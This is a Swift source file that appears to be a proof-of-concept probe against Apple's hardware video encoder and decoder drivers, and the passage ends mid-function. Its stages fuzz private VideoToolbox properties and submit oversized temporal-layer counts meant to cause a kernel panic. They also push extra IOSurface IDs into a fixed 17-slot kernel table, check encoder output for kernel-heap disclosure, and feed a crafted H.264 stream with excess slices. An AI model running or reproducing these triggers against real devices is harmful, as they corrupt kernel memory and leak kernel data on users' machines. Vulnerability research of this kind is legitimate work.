import Foundation
import IOSurface
import VideoToolbox
import CoreMedia
import CoreVideo

private let decLock = NSLock()
private var decResults: [String] = []

final class Probe {
    static let shared = Probe()
    private(set) var log = ""

    private lazy var liveURL: URL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        .appendingPathComponent("live.txt")

    private func emit(_ s: String) {
        log += s + "\n"
        NSLog("AVEPOC %@", s)
        let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        var isDir: ObjCBool = false
        if !FileManager.default.fileExists(atPath: dir.path, isDirectory: &isDir) || !isDir.boolValue {
            try? FileManager.default.removeItem(at: dir)
            try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        }
        if let d = (s + "\n").data(using: .utf8) {
            if let h = try? FileHandle(forWritingTo: liveURL) {
                h.seekToEndOfFile(); h.write(d); try? h.close()
            } else {
                try? d.write(to: liveURL)
            }
        }
    }

    private func fourCC(_ v: OSType) -> String {
        let bytes: [UInt8] = [
            UInt8((v >> 24) & 0xff), UInt8((v >> 16) & 0xff),
            UInt8((v >> 8) & 0xff), UInt8(v & 0xff)
        ]
        return String(bytes: bytes, encoding: .ascii) ?? "?"
    }

    private func makeSession(codec: CMVideoCodecType, w: Int32, h: Int32) -> VTCompressionSession? {
        var session: VTCompressionSession?
        let status = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: w, height: h,
            codecType: codec,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session)
        emit("VTCompressionSessionCreate(\(fourCC(codec))) status=\(status)")
        return session
    }

    private func readBack(_ session: VTSession, _ key: CFString) -> String {
        var out: CFTypeRef?
        let st = VTSessionCopyProperty(session, key: key, allocator: kCFAllocatorDefault, valueOut: &out)
        if st != 0 { return "copyErr=\(st)" }
        if let n = out as? NSNumber { return "value=\(n.intValue)" }
        return "value=\(String(describing: out))"
    }

    /// Stage 1: only set/read properties. No encode, no frame submission.
    func stage1() {
        var encoderList: CFArray?
        let lst = VTCopyVideoEncoderList(nil, &encoderList)
        if lst != 0 { emit("VTCopyVideoEncoderList status=\(lst)") }
        if let list = encoderList as? [[String: Any]] {
            for e in list {
                let codec = (e[kVTVideoEncoderList_CodecType as String] as? NSNumber)?.uint32Value ?? 0
                if codec == kCMVideoCodecType_HEVC {
                    emit("encoder HEVC: \(e[kVTVideoEncoderList_EncoderID as String] ?? "?") name=\(e[kVTVideoEncoderList_DisplayName as String] ?? "?")")
                }
            }
        }

        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("no session")
            return
        }

        var encoderID: CFString?
        var supported: CFDictionary?
        let s1 = VTCopySupportedPropertyDictionaryForEncoder(
            width: 1280, height: 720, codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil, encoderIDOut: &encoderID, supportedPropertiesOut: &supported)
        emit("SupportedPropertyDictionary status=\(s1) encoderID=\(encoderID ?? "nil" as CFString)")
        if let sup = supported as? [String: Any] {
            let keys = sup.keys.sorted()
            emit("supported count=\(keys.count) hasNumberOfTemporalLayers=\(keys.contains("NumberOfTemporalLayers"))")
            let interesting = keys.filter { $0.lowercased().contains("temporal") || $0.lowercased().contains("mvhevc") || $0.lowercased().contains("layer") }
            emit("layer-ish keys: \(interesting)")
        }

        let key = "NumberOfTemporalLayers" as CFString
        for v in [1, 4, 7, 8, 16, 64] {
            let st = VTSessionSetProperty(session, key: key, value: NSNumber(value: v))
            emit("SetProperty NumberOfTemporalLayers=\(v) status=\(st) readback: \(readBack(session, key))")
        }
        VTCompressionSessionInvalidate(session)
    }

    /// Stage 2: submit frames with a value the pre-fix driver never bounded.
    func stage2(value: Int, realtime: Bool = true, efr: Int = 30, blr: Int = 15) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("no session")
            return
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: realtime ? kCFBooleanTrue : kCFBooleanFalse)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowFrameReordering, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowTemporalCompression, value: kCFBooleanTrue)
        let sEfr = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ExpectedFrameRate, value: NSNumber(value: efr))
        let sBlr = VTSessionSetProperty(session, key: "BaseLayerFrameRate" as CFString, value: NSNumber(value: blr))
        let st = VTSessionSetProperty(session, key: "NumberOfTemporalLayers" as CFString, value: NSNumber(value: value))
        emit("stage2 rt=\(realtime) efr=\(efr)(\(sEfr)) blr=\(blr)(\(sBlr)) NumberOfTemporalLayers(\(value)) status=\(st)")

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        let pst = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                      kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                      attrs as CFDictionary, &pb)
        emit("CVPixelBufferCreate status=\(pst)")
        guard let pixel = pb else { return }

        for i in 0..<40 {
            let pts = CMTime(value: CMTimeValue(i), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
            emit("EncodeFrame[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        emit("after-encode readback: " + readBack(session, "NumberOfTemporalLayers" as CFString))
        emit("stage2 complete")
        VTCompressionSessionInvalidate(session)
    }

    /// Stage 3: brute-force property acceptance. No encode.
    func fuzz() {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("no session"); return
        }
        var encoderID: CFString?
        var supported: CFDictionary?
        let s1 = VTCopySupportedPropertyDictionaryForEncoder(
            width: 1280, height: 720, codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil, encoderIDOut: &encoderID, supportedPropertiesOut: &supported)
        if let sup = supported as? [String: Any] {
            let keys = sup.keys.sorted()
            try? keys.joined(separator: "\n").write(
                to: FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                    .appendingPathComponent("props.txt"), atomically: true, encoding: .utf8)
            emit("supported count=\(keys.count) dumpStatus=\(s1)")
        }

        let candidates = [
            "NumOfTemporalLayer", "NumberOfTemporalLayers", "NumOfGOPLayer",
            "MCTFStrengthLevel", "RPSData", "RPSInfo", "ChromaQPIndexOffsetMultiPPS",
            "HEVCTemporalLevelInfoCombinations", "CreateTemporalLevelInfoDictionary",
            "HEVCAuxiliaryLayerIDs", "MVHEVCVideoLayerIDs", "NumberOfSlices",
            "AbsDeltaRPSMinus1", "DeltaRPSSign", "MultiReferencePSpacing",
            "NumNegativePics", "NumPositivePics", "NumOfBFrame", "NumOfPFrame",
            "MaximumReferenceFrameDistance", "RefNumOfBFrameL0", "RefNumOfBFrameL1",
            "RefNumOfPFrame", "LRMERSPassNum", "MCTFMaxNextRefNum"
        ]
        let numbers = [0, 1, 2, 3, 8, 16, 64, 1000]
        for key in candidates {
            var line = "KEY \(key):"
            for v in numbers {
                let st = VTSessionSetProperty(session, key: key as CFString, value: NSNumber(value: v))
                line += " n\(v)=\(st)"
            }
            let bigArr = (0..<16).map { NSNumber(value: $0 + 1) } as CFArray
            let stArr = VTSessionSetProperty(session, key: key as CFString, value: bigArr)
            line += " arr16=\(stArr)"
            emit(line)
        }
        emit("fuzz done")
        VTCompressionSessionInvalidate(session)
    }

    /// Stage 4: multi-PPS chroma QP ladder then encode.
    func stage4(count: Int) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("no session"); return
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowTemporalCompression, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ExpectedFrameRate, value: NSNumber(value: 30))
        let s = Array(repeating: "0", count: count).joined(separator: " ")
        let st = VTSessionSetProperty(session, key: "ChromaQPIndexOffsetMultiPPS" as CFString, value: s as CFString)
        let rd = readBack(session, "ChromaQPIndexOffsetMultiPPS" as CFString)
        emit("stage4 ChromaQPIndexOffsetMultiPPS(count=\(count)) status=\(st) readback: \(rd)")

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("no pixel"); return }
        for i in 0..<12 {
            let pts = CMTime(value: CMTimeValue(i), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
            emit("EncodeFrame[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        emit("stage4 complete")
        VTCompressionSessionInvalidate(session)
    }

    /// Stage 5: probe the layer/PS-ID array properties that feed the kext VPS validator.
    func stage5() {
        let keys = [
            "MVHEVCVideoLayerIDs",
            "MVHEVCViewIDs",
            "MVHEVCLeftAndRightViewIDs",
            "HEVCAuxiliaryLayerIDs",
            "RequiredMVHEVCSequenceParameterSetIDs",
            "RequiredMVHEVCPictureParameterSetIDs",
            "RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
            "RequiredHEVCVideoParameterSetAlphaLayerID",
            "HEVCTemporalLevelInfoCombinations",
            "TemporalIDNestingFlag",
            "BaseLayerFrameRate",
        ]
        func arr(_ n: Int, _ v: Int = 0) -> CFArray {
            Array(repeating: NSNumber(value: v), count: n) as CFArray
        }
        func arr64() -> CFArray {
            Array((0..<64).map { NSNumber(value: $0 % 64) }) as CFArray
        }
        func shape(_ tag: String, _ v: Any) -> (String, Any) { (tag, v) }

        let shapes: [(String, Any)] = [
            shape("n1", NSNumber(value: 1)),
            shape("n0", NSNumber(value: 0)),
            shape("a1", arr(1)),
            shape("a2", arr(2)),
            shape("a4", arr(4)),
            shape("a16", arr(16)),
            shape("a64", arr64()),
            shape("a2seq", [NSNumber(value: 0), NSNumber(value: 1)] as CFArray),
            shape("truth", kCFBooleanTrue as Any),
        ]

        for name in keys {
            guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
                emit("stage5 \(name): no session"); continue
            }
            var line = "stage5 \(name):"
            for (tag, value) in shapes {
                let st = VTSessionSetProperty(session, key: name as CFString, value: value as CFTypeRef)
                line += " \(tag)=\(st)"
            }
            emit(line)
            VTCompressionSessionInvalidate(session)
        }
        emit("stage5 complete")
    }

    private func compact(_ v: Any?) -> String {
        guard let v = v else { return "nil" }
        if let d = v as? [String: Any] {
            return "{" + d.keys.sorted().map { "\($0)=\(compact(d[$0]))" }.joined(separator: ",") + "}"
        }
        if let a = v as? [Any] {
            return "[" + a.prefix(8).map { compact($0) }.joined(separator: ",") + (a.count > 8 ? ",..." : "") + "]"
        }
        if let n = v as? NSNumber { return "\(n)" }
        if let s = v as? String { return s }
        return String(describing: v)
    }

    /// Stage 7: dump the complete supported-property dictionary with per-key metadata
    /// (MinValue/MaxValue/PropertyType/DefaultValue), for both HEVC and AVC.
    func stage7() {
        for codec in [kCMVideoCodecType_HEVC, kCMVideoCodecType_H264] {
            var encoderID: CFString?
            var supported: CFDictionary?
            let st = VTCopySupportedPropertyDictionaryForEncoder(
                width: 1280, height: 720, codecType: codec,
                encoderSpecification: nil, encoderIDOut: &encoderID, supportedPropertiesOut: &supported)
            emit("== stage7 \(fourCC(codec)) status=\(st) encoderID=\(encoderID ?? "nil" as CFString)")
            guard let sup = supported as? [String: Any] else { emit("no dict"); continue }
            emit("stage7 \(fourCC(codec)) count=\(sup.count)")
            for k in sup.keys.sorted() {
                emit("D \(fourCC(codec)) \(k) \(compact(sup[k]))")
            }
        }
        emit("stage7 complete")
    }

    /// Stage 8: set one property key to each value, then encode; used for keys whose
    /// dictionary range changed between builds.
    func stage8(key: String, values: [Int]) {
        for v in values {
            guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
                emit("stage8 \(key)=\(v): no session"); continue
            }
            _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
            _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowFrameReordering, value: kCFBooleanTrue)
            _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ExpectedFrameRate, value: NSNumber(value: 30))
            _ = VTSessionSetProperty(session, key: "BaseLayerFrameRate" as CFString, value: NSNumber(value: 15))
            let st = VTSessionSetProperty(session, key: key as CFString, value: NSNumber(value: v))
            emit("stage8 \(key)=\(v) setStatus=\(st) readback: \(readBack(session, key as CFString))")
            if st == 0 {
                var attrs: [CFString: Any] = [:]
                attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
                var pb: CVPixelBuffer?
                _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                        attrs as CFDictionary, &pb)
                if let pixel = pb {
                    var bad = 0
                    for i in 0..<20 {
                        let pts = CMTime(value: CMTimeValue(i), timescale: 30)
                        let est = VTCompressionSessionEncodeFrame(
                            session, imageBuffer: pixel, presentationTimeStamp: pts,
                            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
                        if est != 0 { bad = Int(est); emit("stage8 \(key)=\(v) encode[\(i)] status=\(est)"); break }
                    }
                    VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
                    emit("stage8 \(key)=\(v) encodeDone bad=\(bad)")
                }
            }
            VTCompressionSessionInvalidate(session)
        }
        emit("stage8 complete")
    }

    /// Stage 9: v190 recipe — EncoderUsage=1, RCMode=20, oversized NumberOfTemporalLayers,
    /// then the first frame submit (PrepareToEncodeFrames). Live oracle: last line in live.txt
    /// tells how far it got; a kernel panic after "encode[0]" is the defect firing.
    func stage9(n: Int) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage9(\(n)): no session"); return
        }
        let sUsage = VTSessionSetProperty(session, key: "EncoderUsage" as CFString, value: NSNumber(value: 1))
        let sRC = VTSessionSetProperty(session, key: "RCMode" as CFString, value: NSNumber(value: 20))
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        let st = VTSessionSetProperty(session, key: "NumberOfTemporalLayers" as CFString, value: NSNumber(value: n))
        emit("stage9(\(n)) usage=\(sUsage) rc=\(sRC) ntl=\(st) readback: " + readBack(session, "NumberOfTemporalLayers" as CFString))

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage9: no pixel"); return }
        for i in 0..<4 {
            let pts = CMTime(value: CMTimeValue(i), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
            emit("stage9(\(n)) encode[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        emit("stage9(\(n)) survived")
        VTCompressionSessionInvalidate(session)
        emit("stage9 complete")
    }

    /// Stage 10: extcal ladder — one temporal-layer count per session, capture the
    /// parameter sets the encoder returns (VPS/SPS/PPS) with sizes and byte prefixes,
    /// so a count-driven VPS growth / kernel-heap disclosure shows up app-side.
    func stage10(n: Int, usage: Int = 0) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage10(\(n),\(usage)): no session"); return
        }
        if usage != 0 {
            let su = VTSessionSetProperty(session, key: "EncoderUsage" as CFString, value: NSNumber(value: usage))
            emit("stage10(\(n),\(usage)) encoderUsage status=\(su)")
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowFrameReordering, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowTemporalCompression, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ExpectedFrameRate, value: NSNumber(value: 30))
        _ = VTSessionSetProperty(session, key: "BaseLayerFrameRate" as CFString, value: NSNumber(value: 15))
        let st = VTSessionSetProperty(session, key: "NumberOfTemporalLayers" as CFString, value: NSNumber(value: n))
        emit("stage10(\(n),\(usage)) ntl=\(st) readback: " + readBack(session, "NumberOfTemporalLayers" as CFString))

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage10: no pixel"); return }
        if let y = CVPixelBufferGetBaseAddressOfPlane(pixel, 0) {
            let h = CVPixelBufferGetHeightOfPlane(pixel, 0)
            let bpr = CVPixelBufferGetBytesPerRowOfPlane(pixel, 0)
            memset(y, 0x40, h * bpr)
        }
        if let uv = CVPixelBufferGetBaseAddressOfPlane(pixel, 1) {
            let h = CVPixelBufferGetHeightOfPlane(pixel, 1)
            let bpr = CVPixelBufferGetBytesPerRowOfPlane(pixel, 1)
            memset(uv, 128, h * bpr)
        }

        var fmtDesc: CMVideoFormatDescription?
        for i in 0..<3 {
            let pts = CMTime(value: CMTimeValue(i), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { status, _, sb in
                if status == 0, let sb = sb, fmtDesc == nil {
                    fmtDesc = CMSampleBufferGetFormatDescription(sb)
                }
            }
            emit("stage10(\(n),\(usage)) encode[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)

        var psBytes = Data()
        if let fd = fmtDesc {
            var cnt = 0
            var hdr: Int32 = 0
            let r0 = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
                parameterSetSizeOut: nil, parameterSetCountOut: &cnt, nalUnitHeaderLengthOut: &hdr)
            var i = 0
            while i < Int(cnt) {
                var p: UnsafePointer<UInt8>?
                var sz = 0
                let r = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fd, parameterSetIndex: i, parameterSetPointerOut: &p,
                    parameterSetSizeOut: &sz, parameterSetCountOut: nil, nalUnitHeaderLengthOut: nil)
                if r == 0, let p = p, sz > 0 {
                    let type = (Int(p[0]) >> 1) & 0x3f
                    let head = (0..<min(sz, 16)).map { String(format: "%02x", p[$0]) }.joined()
                    emit("stage10(\(n),\(usage)) PS\(i) type=\(type) size=\(sz) head=\(head)")
                    psBytes.append(contentsOf: UnsafeBufferPointer(start: p, count: sz))
                }
                i += 1
            }
            emit("stage10(\(n),\(usage)) psCount=\(cnt) hdrLen=\(hdr) r0=\(r0) psTotal=\(psBytes.count)")
            let psURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                .appendingPathComponent("extcal_\(n)_u\(usage).ps")
            try? psBytes.write(to: psURL)
        } else {
            emit("stage10(\(n),\(usage)) no format description")
        }
        VTCompressionSessionInvalidate(session)
        emit("stage10 complete")
    }

    /// Stage 12: the real userDPB shape — DPBRequirements dict {NumberOfFrames,
    /// AllocateRVRABuffers} plus UserDPBFramesForFaceTime array of IOSurfaces.
    /// Pre-fix writes N IOSurface IDs into the 17-slot table at session+0xb68.
    func stage12(n: Int, shape: Int = 1, usage: Int = 0) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage12(\(n),\(shape)): no session"); return
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        if usage != 0 {
            let su = VTSessionSetProperty(session, key: "EncoderUsage" as CFString, value: NSNumber(value: usage))
            emit("stage12(\(n),\(shape)) usage=\(usage) status=\(su)")
        }
        let sRef = VTSessionSetProperty(session, key: "EnableUserRefForFacetime" as CFString, value: kCFBooleanTrue)
        emit("stage12(\(n),\(shape)) userRef=\(sRef)")

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage12(\(n),\(shape)): no pixel"); return }

        // Frame 0 starts the encoder session so pcVCP exists.
        let est0 = VTCompressionSessionEncodeFrame(
            session, imageBuffer: pixel, presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
        emit("stage12(\(n),\(shape)) encode[0] status=\(est0)")
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)

        let alloc = shape >= 3
        let req: [CFString: Any] = [
            "NumberOfFrames" as CFString: NSNumber(value: n),
            "AllocateRVRABuffers" as CFString: (alloc ? kCFBooleanTrue : kCFBooleanFalse) as Any
        ]
        let sReq = VTSessionSetProperty(session, key: "DPBRequirements" as CFString, value: req as CFDictionary)
        emit("stage12(\(n),\(shape)) dpbReqStatus=\(sReq)")

        var ids: [NSNumber] = []
        for _ in 0..<n * (alloc ? 2 : 1) {
            var a: [CFString: Any] = [:]
            a[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
            var p: CVPixelBuffer?
            if CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                   kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                   a as CFDictionary, &p) == 0, let p = p,
               let s = CVPixelBufferGetIOSurface(p) {
                ids.append(NSNumber(value: IOSurfaceGetID(s.takeUnretainedValue())))
            }
        }
        emit("stage12(\(n),\(shape)) surfaces=\(ids.count)")
        let sFrames = VTSessionSetProperty(session, key: "UserDPBFramesForFaceTime" as CFString,
                                           value: ids as CFArray)
        emit("stage12(\(n),\(shape)) framesStatus=\(sFrames)")

        for i in 1..<3 {
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: CMTime(value: CMTimeValue(i), timescale: 30),
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
            emit("stage12(\(n),\(shape)) encode[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        emit("stage12(\(n),\(shape)) survived")
        VTCompressionSessionInvalidate(session)
        emit("stage12 complete")
    }

    /// Stage 20: decode an Annex-B H.264 file from Documents. The pre-fix AVD parser
    /// accepts up to 900 slices while the HW work area is sized by the platform cap.
    func stage20(file: String) {
        let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent(file)
        guard let data = try? Data(contentsOf: url) else { emit("stage20 \(file): no file"); return }
        let bytes = [UInt8](data)
        var nals: [[UInt8]] = []
        var i = 0
        while i + 3 < bytes.count {
            if bytes[i] == 0, bytes[i + 1] == 0, bytes[i + 2] == 1 || (bytes[i + 2] == 0 && bytes[i + 3] == 1) {
                let sc = bytes[i + 2] == 1 ? 3 : 4
                let start = i + sc
                var j = start
                while j + 2 < bytes.count {
                    if bytes[j] == 0, bytes[j + 1] == 0, bytes[j + 2] == 1 { break }
                    if bytes[j] == 0, bytes[j + 1] == 0, bytes[j + 2] == 0, j + 3 < bytes.count, bytes[j + 3] == 1 { break }
                    j += 1
                }
                if j > start { nals.append(Array(bytes[start..<j])) }
                i = j
            } else { i += 1 }
        }
        var sps: [UInt8]? = nil
        var pps: [UInt8]? = nil
        for n in nals {
            let t = n[0] & 0x1f
            if t == 7, sps == nil { sps = n }
            if t == 8, pps == nil { pps = n }
        }
        guard let s = sps, let p = pps, let fd = Self.h264FormatDescription(s, p) else {
            emit("stage20 \(file): no sps/pps (nals=\(nals.count))"); return
        }
        var aus: [[[UInt8]]] = []
        var cur: [[UInt8]] = []
        var vclCount = 0
        for n in nals {
            let t = n[0] & 0x1f
            if t == 7 || t == 8 { continue }
            let isVCL = (t == 1 || t == 5)
            if isVCL {
                if Self.firstMbInSlice(n) == 0 && vclCount > 0 {
                    aus.append(cur); cur = []; vclCount = 0
                }
                vclCount += 1
            }
            cur.append(n)
        }
        if vclCount > 0 { aus.append(cur) }
        let realCount = aus.count
        if let first = aus.first { aus.append(first) }
        emit("stage20 \(file) nals=\(nals.count) aus=\(realCount)")

        var ds: VTDecompressionSession?
        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferPixelFormatTypeKey] = NSNumber(value: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange)
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        let spec: [CFString: Any] = [
            "RequireHardwareAcceleratedVideoDecoder" as CFString: kCFBooleanTrue as Any
        ]
        let cst = VTDecompressionSessionCreate(allocator: kCFAllocatorDefault, formatDescription: fd,
                                               decoderSpecification: spec as CFDictionary,
                                               imageBufferAttributes: attrs as CFDictionary,
                                               outputCallback: nil, decompressionSessionOut: &ds)
        guard cst == 0, let d = ds else { emit("stage20 \(file): decCreate(hwReq)=\(cst)"); return }
        var hwRef: CFTypeRef?
        VTSessionCopyProperty(d, key: "UsingHardwareAcceleratedVideoDecoder" as CFString,
                              allocator: kCFAllocatorDefault, valueOut: &hwRef)
        emit("stage20 \(file) usingHW=\(String(describing: hwRef))")
        for (idx, au) in aus.enumerated() {
            let (sbOpt, sbErr) = Self.sampleBuffer(au, fd, pts: CMTimeValue(idx))
            guard let sb = sbOpt else {
                emit("stage20 \(file) au[\(idx)]: no sampleBuffer (\(sbErr))"); continue
            }
            var flags = VTDecodeInfoFlags()
            let st = VTDecompressionSessionDecodeFrame(
                d, sampleBuffer: sb, flags: [], infoFlagsOut: &flags) { status, _, imageBuffer, _, _ in
                decLock.lock()
                decResults.append("au\(idx):cb(st=\(status),img=\(imageBuffer != nil))")
                decLock.unlock()
            }
            if idx < realCount {
                emit("stage20 \(file) au[\(idx)] slices=\(au.filter { (($0[0] & 0x1f) == 1 || ($0[0] & 0x1f) == 5) }.count) status=\(st)")
            }
        }
        VTDecompressionSessionFinishDelayedFrames(d)
        VTDecompressionSessionWaitForAsynchronousFrames(d)
        decLock.lock(); let cb = Array(decResults.prefix(realCount)); decResults = []; decLock.unlock()
        emit("stage20 \(file) callbacks=\(cb)")
        emit("stage20 \(file) survived")
        VTDecompressionSessionInvalidate(d)
        emit("stage20 complete")
    }

    static func h264FormatDescription(_ sps: [UInt8], _ pps: [UInt8]) -> CMVideoFormatDescription? {
        var fd: CMVideoFormatDescription?
        let sp = UnsafeMutablePointer<UInt8>.allocate(capacity: sps.count)
        sp.update(from: sps, count: sps.count)
        let pp = UnsafeMutablePointer<UInt8>.allocate(capacity: pps.count)
        pp.update(from: pps, count: pps.count)
        defer { sp.deallocate(); pp.deallocate() }
        let sizes: [Int] = [sps.count, pps.count]
        let ptrs: [UnsafePointer<UInt8>] = [UnsafePointer(sp), UnsafePointer(pp)]
        let st = ptrs.withUnsafeBufferPointer { pb in
            sizes.withUnsafeBufferPointer { sz in
                CMVideoFormatDescriptionCreateFromH264ParameterSets(
                    allocator: kCFAllocatorDefault, parameterSetCount: 2,
                    parameterSetPointers: pb.baseAddress!, parameterSetSizes: sz.baseAddress!,
                    nalUnitHeaderLength: 4, formatDescriptionOut: &fd)
            }
        }
        return st == 0 ? fd : nil
    }

    static func firstMbInSlice(_ nal: [UInt8]) -> Int {
        var rbsp: [UInt8] = []
        var zeros = 0
        for b in nal.dropFirst() {
            if zeros >= 2 && b == 3 { zeros = 0; continue }
            rbsp.append(b)
            zeros = b == 0 ? zeros + 1 : 0
        }
        var bits: [UInt8] = []
        for b in rbsp { for k in (0..<8).reversed() { bits.append((b >> k) & 1) } }
        var pos = 0
        var z = 0
        while pos < bits.count && bits[pos] == 0 { z += 1; pos += 1 }
        if pos >= bits.count { return -1 }
        pos += 1
        var val = 0
        for _ in 0..<z { val = (val << 1) | Int(bits[pos]); pos += 1 }
        return (1 << z) - 1 + val
    }

    static func sampleBuffer(_ au: [[UInt8]], _ fd: CMVideoFormatDescription, pts: CMTimeValue) -> (CMSampleBuffer?, String) {
        let total = au.reduce(0) { $0 + 4 + $1.count }
        guard let p = calloc(1, total)?.assumingMemoryBound(to: Int8.self) else { return (nil, "calloc") }
        var off = 0
        for n in au {
            let len = UInt32(n.count)
            p[off] = Int8(bitPattern: UInt8((len >> 24) & 0xff))
